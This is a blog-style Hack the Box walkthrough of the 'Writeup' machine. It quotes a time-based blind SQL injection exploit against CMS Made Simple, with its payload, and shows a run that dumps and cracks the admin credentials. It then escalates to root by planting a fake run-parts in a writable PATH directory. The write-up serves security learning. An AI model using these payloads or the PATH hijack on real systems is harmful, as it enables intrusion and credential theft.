---
layout:     post
title:      Hack the Box - Writeup
date:       2019-10-12 11:00:00 -0400
summary:    HTB Writeup machine walkthrough. Stepping through methodology of what worked, what didn't and any interesting notes gleaned along the way.
categories: hack-the-box
thumbnail: cogs
tags:
 - htb
 - cms
 - pspy
 - walkthrough
 - writeup
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-writeup/infocard.PNG' | relative_url }}">
</p>

<p>Overall a nice simple box from HTB. The machine was relatively easy with an out-of-the-box CMS exploit for user and an interesting login behavior abuse to pivot to root. I'll cover both the proper exploits but also a few of my /facepalm moments throughout the experience.</p>

<h1>Initial Recon</h1>

<p>The machine's IP was 10.10.10.138. Let's start off with an <code>nmap</code> enumaration and see what we can find</p>

{% highlight shell %}
nmap -sS -Pn -p1- -sV -sC --open -v 10.10.10.138
...
Nmap scan report for 10.10.10.138
Host is up (0.018s latency).
Not shown: 65533 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
{% endhighlight %}

<p>Alright, SSH and potential web-service. Let's pop over to the browser and see what we can find</p>

<p align="center">
<img src="{{ '/assets/htb-writeup/mainscreen.PNG' | relative_url }}">
</p>

<p>Nothing too useful. Let's open up burpsuite and see if we can find anything else of use through here. We do a quick spider and end up with the following.</p>

<p align="center">
<img src="{{ '/assets/htb-writeup/burpsuite.PNG' | relative_url }}">
</p>

<p>That's a bit better! We even see index.php that accepts a page parameter. This is starting to look promising. Wait, we didn't see anything of that useful on the main page, how did our spider result get /writeup? Oh there we go, look at robots.txt:<p>

{% highlight python %}
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`
# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
{% endhighlight %}

<h1>User exploitation</h1>

<p>Lesson learned regarding checking everything - always check robots.txt for any leftover crumbs. Let's not make that same mistake twice and go through the source code of the newly discovered writeup/index.php page and see what we can come up with.</p>

{% highlight python %}
<base href="http://10.10.10.138/writeup/" />
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
{% endhighlight %}

<p>This seems interesting. From previous experience we know there are a quite a few CMS related exploits. While we don't see the exact version used here we can initially assume that it is a version released sometime in 2019. Let's see what searchploit has for us.</p>

{% highlight python %}
$> searchsploit CMS Made Simple
------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                    |  Path
                                                                                                  | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------------------------
CMS Made Simple (CMSMS) Showtime2 - File Upload RCE (Metasploit)                                  | exploits/php/remote/46627.rb
CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                           | exploits/php/webapps/26217.html
CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                           | exploits/php/webapps/26298.txt
CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                                        | exploits/php/webapps/29272.txt
CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                            | exploits/php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                           | exploits/php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                                 | exploits/php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                                       | exploits/php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                              | exploits/php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                                  | exploits/php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                                      | exploits/php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                                     | exploits/php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                               | exploits/php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                                  | exploits/php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                                                  | exploits/php/webapps/12009.html
CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                                     | exploits/php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                           | exploits/php/webapps/34068.html
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                                  | exploits/php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                                     | exploits/php/webapps/44192.txt
CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                     | exploits/php/webapps/44976.py
CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                     | exploits/php/webapps/45793.py
CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                                   | exploits/php/webapps/39760.txt
CMS Made Simple < 2.2.10 - SQL Injection                                                          | exploits/php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                                  | exploits/php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                             | exploits/php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload                    | exploits/php/webapps/46546.py
------------------------------------------------------------------------------------------------------------------------------------------
{% endhighlight %}

<p>Geez still a large field. Alright, let's ignore the modules and focus on only the core CMS Made Simple since we don't have any more hints as to what is actually installed. With our assumption that we are working with a version released in 2019 let's take a look at <code>CMS Made Simple < 2.2.10 - SQL Injection</code> a little more closely and see if it will be useful for us.</p>

<p>The exploit's functions all repeat a similar pattern for salt, username, email and password. Let's step through one of those and understand what is going on.</p>

{% highlight python %}
...
url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
...
def dump_username():
...
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_db_name = db_name + dictionary[i]
            ord_db_name_temp = ord_db_name + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_db_name)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            db_name = temp_db_name
            ord_db_name = ord_db_name_temp
    output += '\n[+] Username found: ' + db_name
    flag = True
{% endhighlight %}

<p>Simply put the exploit iterates through the list of characters, attempting to compare to the actual username. When the character matches the stored username the nested sleep function is also triggered - causing the request to take longer than an unsuccessful request by a measure of <code>TIME</code> defined in the code. <a href="http://www.sqlinjection.net/time-based/">sqlinject.net</a> explains this concept:</p>

<blockquote> <i>The attacker may also be interested to extract some information or at least verify a few assumptions. ... this can be done by integrating the time delay inside a conditional statement</i>. </blockquote>

<p>By capturing the <code>elapsed_time</code> while executing the payload we can determine the right first character when the query takes <code>TIME</code> more time. Once successful, the loop stores that character and moves on to the next - repeating the process until no further characters trigger the sleep function, letting us know we have the full value.</p>

<p>Alright enough theory - let's run the exploit and hope for the best.</p>

{% highlight shell %}
python 46635.py -u http://10.10.10.138/writeup --crack --wordlist /root/Desktop/rockyou.txt 

[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
{% endhighlight %}

<p>Bingo, user creds! So here is a proud facepalm moment. Prior to above run, I ran the exploit without <code>--crack</code> or <code>--wordlist</code> and got the same output as above without the password cracked output. In my momentary ignorance I completely ignored that this even looked like a hash, took that line of output verbatim and actually thought this was the password. As you can see below clearly that did not get me far.</p>

<p align="center">
<img src="{{ '/assets/htb-writeup/post-exploit1.PNG' | relative_url }}">
</p>

<p>Thankfully I quickly realized my error and ran the cracked variant. Just like that we have user access through SSH.</p>

{% highlight shell %}
ssh jkr@10.10.10.138
jkr@10.10.10.138's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jkr@writeup:~$ pwd
/home/jkr
jkr@writeup:~$ ls
user.txt
jkr@writeup:~$ cat user.txt 
d4e493*******************
jkr@writeup:~$ 
{% endhighlight %}

<h1>Root exploitation</h1>

<p>the usual initial checks did not return anything interesting - sudoers list, running processes, initial poking around at the files. Decided to get a few helper scripts over to the host and see if anything else would come up.</p>

{% highlight shell %}
scp pspy64 jkr@10.10.10.138:/home/jkr/pspy64
jkr@10.10.10.138's password: 
{% endhighlight %}

<p>Left pspy running in a terminal while I continued to poke around. There were a few other folks on the machine around the same time as me. At first I didn't think pspy would return anything useful, then I saw a few more people log on and something interesting happened.</p>

{% highlight python %}
2019/10/01 16:25:13 CMD: UID=0    PID=2689   | sshd: [accepted]  
2019/10/01 16:25:25 CMD: UID=0    PID=2690   | sshd: jkr [priv]  
2019/10/01 16:25:25 CMD: UID=0    PID=2691   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/10/01 16:25:25 CMD: UID=0    PID=2692   | run-parts --lsbsysinit /etc/update-motd.d 
2019/10/01 16:25:25 CMD: UID=0    PID=2693   | uname -rnsom 
2019/10/01 16:25:25 CMD: UID=0    PID=2694   | sshd: jkr [priv] 
{% endhighlight %}

<p>So what is happening here? Looks like on SSH connection a logon function gets triggered. I wasn't completely familiar with the various options and flags so took a look at the man pages.</p>

{% highlight shell %}
ENV(1)                                                       User Commands                                                       ENV(1)

NAME
       env - run a program in a modified environment

SYNOPSIS
       env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...]

DESCRIPTION
       Set each NAME to VALUE in the environment and run COMMAND.

       Mandatory arguments to long options are mandatory for short options too.

       -i, --ignore-environment
              start with an empty environment
{% endhighlight %}

<p>Ok so breaking it down: As root, clear out environment variables, set <code>PATH</code> then execute <code>run-parts</code>. Similarly let's look at run-parts' options. You may already know where I went wrong but let's follow my logic as I stepped through.</p>

{% highlight shell %}
RUN-PARTS(8)                                            System Manager's Manual                                            RUN-PARTS(8)

NAME
       run-parts - run scripts or programs in a directory

SYNOPSIS
       run-parts  [--test]  [--verbose]  [--report]  [--lsbsysinit]  [--regex=RE]  [--umask=umask]  [--arg=argument]  [--exit-on-error]
       [--help] [--version] [--list] [--reverse] [--] DIRECTORY

       run-parts -V

DESCRIPTION
       run-parts runs all the executable files named within constraints described below, found in directory directory.  Other files and
       directories are silently ignored.

       If  neither  the  --lsbsysinit  option  nor the --regex option is given then the names must consist entirely of ASCII upper- and
       lower-case letters, ASCII digits, ASCII underscores, and ASCII minus-hyphens.

       If the --lsbsysinit option is given, then the names must not end in .dpkg-old  or .dpkg-dist or .dpkg-new or .dpkg-tmp, and must
       belong  to  one  or  more  of  the  following  namespaces: the LANANA-assigned namespace (^[a-z0-9]+$); the LSB hierarchical and
       reserved namespaces (^_?([a-z0-9_.]+-)+[a-z0-9]+$); and the Debian cron script namespace (^[a-zA-Z0-9_-]+$).

	  ...
       --lsbsysinit
              use LSB namespaces instead of classical behavior.
{% endhighlight %}

<p>"run scripts or programs in a directory" huh? That sounds amazingly like something we would want to happen. If we could add our own script within <code>/etc/update-motd.d</code> we could trigger it to be executed by root anytime someone ssh'd in to the host. Unfortunately we did not have write capabilities to that folder as jkr and after beating my head against the keyboard for a few minutes I took a step back.</p>

<p>That's when I realized my mistake... take a look at the pspy output again. How is run-parts being run? Explicit location or...relative location! Since we know exactly what <code>PATH</code> is being set to all we have to do is write our own run-parts in one of the PATH locations prior to its regular location. While we didn't have read entitlements at <code>/usr/local/sbin</code> we did have write entitlements. Since I knew the location of the root flag I decided to skip doing anything fancy like a reverse shell and K.I.S.S.</p>

{% highlight python %}
jkr@writeup:/usr/local$ touch sbin/run-parts
jkr@writeup:/usr/local$ echo "cat /root/root.txt > /var/tmp/sneaky.txt" > sbin/run-parts
jkr@writeup:/usr/local$ chmod +x sbin/run-parts
{% endhighlight %}

<p>Now simply open a new terminal and let's hope that everything went smoothly.</p>

{% highlight python %}
jkr@writeup:/var/tmp$ ls -latr
total 12
drwxr-xr-x 12 root root 4096 Apr 19 04:24 ..
drwxrwxrwt  2 root root 4096 Oct  1 17:12 .
-rw-r--r--  1 root root   33 Oct  1 17:12 sneaky.txt
jkr@writeup:/var/tmp$ cat sneaky.txt 
eeba47**********************
{% endhighlight %}

<p>And just like that Writeup is officially in the books.</p>

<h1>Extra fun</h1>

<p>At some point during the pspy enumeration phase I captured what I can only assume was someone utterly exasperated. Unfortunately for them I was too busy trying to get to the end of this box.<p>

<p align="center">
<img src="{{ '/assets/htb-writeup/womp1.PNG' | relative_url }}">
</p>

<p>Thanks folks. Until next time.</p>


